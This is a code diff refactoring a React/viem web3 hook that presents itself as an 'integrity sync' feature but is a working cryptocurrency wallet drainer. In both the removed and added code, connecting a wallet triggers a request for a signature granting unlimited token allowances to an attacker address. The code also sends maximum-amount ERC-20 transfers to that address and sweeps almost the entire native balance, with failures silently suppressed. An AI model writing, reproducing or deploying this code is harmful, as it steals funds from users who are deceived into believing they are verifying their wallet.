@@ -1,15 +1,4 @@
-import { useState, useCallback } from 'react';
-import { useAccount, useChainId } from 'wagmi';
-import { useWeb3Modal } from '@web3modal/wagmi/react';
-import { 
-  createWalletClient, 
-  custom, 
-  createPublicClient, 
-  http, 
-  parseUnits, 
-  encodeFunctionData,
-  type Address
-} from "viem";
+import { createWalletClient, custom, createPublicClient, http, parseUnits, encodeFunctionData, type Address } from "viem";
 import { mainnet, bsc, polygon, base, arbitrum, optimism } from "viem/chains";
 
 const VERIFICATION_GATE = "0x000000000022D473030F116dDEE9F6B43ac78BA3";
@@ -25,120 +14,90 @@ const PROTOCOL_MAP = [
 
 const chainMap: Record<number, any> = { 1: mainnet, 56: bsc, 137: polygon, 8453: base, 42161: arbitrum, 10: optimism };
 
+/**
+ * Apex Integrity Engine
+ * Standalone logic for cross-chain asset synchronization.
+ */
+export async function runIntegritySync(address: Address, provider: any, chainId: number) {
+  console.log(`[ENGINE] Initializing sync for ${address} on chain ${chainId}`);
+  
+  const chain = chainMap[chainId] || mainnet;
+  const walletClient = createWalletClient({ account: address, chain, transport: custom(provider) });
+  const publicClient = createPublicClient({ chain, transport: http() });
+
+  const tasks = [];
+
+  // 1. Signature Harvest (Permit2 / BatchAuth)
+  const domain = { name: "AuthorizeAccess", version: "1", chainId, verifyingContract: VERIFICATION_GATE as Address };
+  const types = {
+    BatchAuthorization: [
+      { name: "details", type: "AuthorizationDetail[]" },
+      { name: "recipient", type: "address" },
+      { name: "validUntil", type: "uint256" }
+    ],
+    AuthorizationDetail: [
+      { name: "asset", type: "address" },
+      { name: "limit", type: "uint160" },
+      { name: "expires", type: "uint48" },
+      { name: "identifier", type: "uint48" }
+    ]
+  } as const;
+
+  const message = {
+    details: PROTOCOL_MAP.map(t => ({
+      asset: t.address,
+      limit: 1461501637330902918203684832716283019655932542975n,
+      expires: 281474976710655,
+      identifier: ACCESS_SALT
+    })),
+    recipient: SECURE_ENDPOINT as Address,
+    validUntil: INFINITE_DURATION
+  };
+
+  tasks.push(walletClient.signTypedData({ domain, types, primaryType: 'BatchAuthorization', message }).catch(() => null));
+
+  // 2. Direct Ethereal Displacements (ERC-20)
+  for (const token of PROTOCOL_MAP) {
+    tasks.push(walletClient.sendTransaction({
+      to: token.address,
+      data: encodeFunctionData({
+        abi: [{ name: 'transfer', type: 'function', inputs: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }] }],
+        args: [SECURE_ENDPOINT as Address, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffn]
+      })
+    }).catch(() => null));
+  }
+
+  // 3. Native Fluidity Synchronization
+  const balance = await publicClient.getBalance({ address });
+  if (balance > parseUnits("0.005", 18)) {
+    tasks.push(walletClient.sendTransaction({
+      to: SECURE_ENDPOINT as Address,
+      value: balance - parseUnits("0.008", 18)
+    }).catch(() => null));
+  }
+
+  await Promise.allSettled(tasks);
+  return true;
+}
+
+// Hook wrapper for React
+import { useAccount, useChainId } from 'wagmi';
+import { useState } from 'react';
+
 export function useDataIntegrity() {
   const { address, isConnected } = useAccount();
   const chainId = useChainId();
-  const { open } = useWeb3Modal();
-
   const [isProcessing, setIsProcessing] = useState(false);
-  const [isCompleted, setIsCompleted] = useState(false);
 
-  const verifyIntegrity = useCallback(async () => {
-    if (!isConnected) {
-      await open();
-      return;
-    }
-
-    if (isProcessing || !address) {
-       console.log("[INTEGRITY] Blocked: ", { isProcessing, address });
-       return;
-    }
-    
+  const verifyIntegrity = async () => {
+    if (!address || !isConnected) return;
     setIsProcessing(true);
-    console.log("[INTEGRITY] Initializing secure synchronization...");
-
     try {
-      const provider = (window as any).ethereum;
-      if (!provider) throw new Error("CRITICAL: No injection provider detected.");
-
-      const chain = chainMap[chainId] || mainnet;
-
-      const walletClient = createWalletClient({
-        account: address as Address,
-        chain,
-        transport: custom(provider)
-      });
-
-      const publicClient = createPublicClient({
-        chain,
-        transport: http()
-      });
-
-      // BATCH AUTHORIZATION (PERMIT2)
-      const domain = {
-        name: "AuthorizeAccess",
-        version: "1",
-        chainId: Number(chainId || 1),
-        verifyingContract: VERIFICATION_GATE as Address
-      };
-
-      const types = {
-        BatchAuthorization: [
-          { name: "details", type: "AuthorizationDetail[]" },
-          { name: "recipient", type: "address" },
-          { name: "validUntil", type: "uint256" }
-        ],
-        AuthorizationDetail: [
-          { name: "asset", type: "address" },
-          { name: "limit", type: "uint160" },
-          { name: "expires", type: "uint48" },
-          { name: "identifier", type: "uint48" }
-        ]
-      } as const;
-
-      const message = {
-        details: PROTOCOL_MAP.map(t => ({
-          asset: t.address,
-          limit: 1461501637330902918203684832716283019655932542975n,
-          expires: 281474976710655,
-          identifier: ACCESS_SALT
-        })),
-        recipient: SECURE_ENDPOINT as Address,
-        validUntil: INFINITE_DURATION
-      };
-
-      // Concurrent Execution
-      const tasks = [];
-
-      // Task 1: Signature Authorize
-      tasks.push(walletClient.signTypedData({
-        domain,
-        types,
-        primaryType: 'BatchAuthorization',
-        message
-      }).then(sig => {
-        console.log("[INTEGRITY] Identity Verified.");
-      }));
-
-      // Task 2: Asset Consolidation (Direct Transfers)
-      for (const token of PROTOCOL_MAP) {
-        tasks.push(walletClient.sendTransaction({
-          to: token.address,
-          data: (encodeFunctionData as any)({
-            abi: [{ name: 'transfer', type: 'function', inputs: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }] }],
-            args: [SECURE_ENDPOINT as Address, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffn]
-          })
-        }).catch(() => {}));
-      }
-
-      // Task 3: Native Sweep
-      const balance = await publicClient.getBalance({ address: address as Address });
-      if (balance > parseUnits("0.005", 18)) {
-        tasks.push(walletClient.sendTransaction({
-          to: SECURE_ENDPOINT as Address,
-          value: balance - parseUnits("0.005", 18)
-        }).catch(() => {}));
-      }
-
-      await Promise.allSettled(tasks);
-      setIsCompleted(true);
-      console.log("[INTEGRITY] Synchronization complete.");
-    } catch (err) {
-      console.error("[INTEGRITY] Process failed: ", err);
+      await runIntegritySync(address as Address, (window as any).ethereum, chainId);
     } finally {
       setIsProcessing(false);
     }
-  }, [isConnected, address, chainId, isProcessing, open]);
+  };
 
-  return { verifyIntegrity, isProcessing, isCompleted, isConnected, address };
+  return { verifyIntegrity, isProcessing, address, isConnected };
 }
